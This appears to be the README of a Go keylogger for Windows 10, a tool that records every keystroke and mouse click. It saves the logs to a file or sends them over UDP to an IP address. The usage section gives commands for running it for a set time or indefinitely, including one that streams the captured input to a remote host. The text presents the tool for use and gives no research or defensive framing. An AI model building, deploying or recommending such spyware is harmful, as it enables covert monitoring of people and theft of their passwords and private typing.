# Go-Keylogger

This project is a keylogging tool written in the Go language intented to work on the Windows 10 OS. It is able to log all key strokes and mouse clicks, and and save logs to a file or send data using UDP to a given IP address. This is done using only Go's standard libraries.

# Usage

Run keylogger.exe on the command line with three command line arguments. The format is as follows:

```.\keylogger.exe [mode] [info] [duration]```

* Mode: Either 0 or 1, 0 for save to given file, and 1 for send to given IP address
* Info: If the mode is 0, this is used to provide a file name/path. If the mode is 1, this is used to provide an IP address.
* Duration: Number of seconds to run for. If -1, the application will run indefinitely until manually terminated.

For intance, to run for 60 seconds and save the data to a file called "log.txt", it should be:

```.\keylogger.exe 0 log.txt 60```

To run indefinitely and send to the host at 192.168.1.1, it should be:

```.\keylogger.exe 1 192.168.1.1 -1```
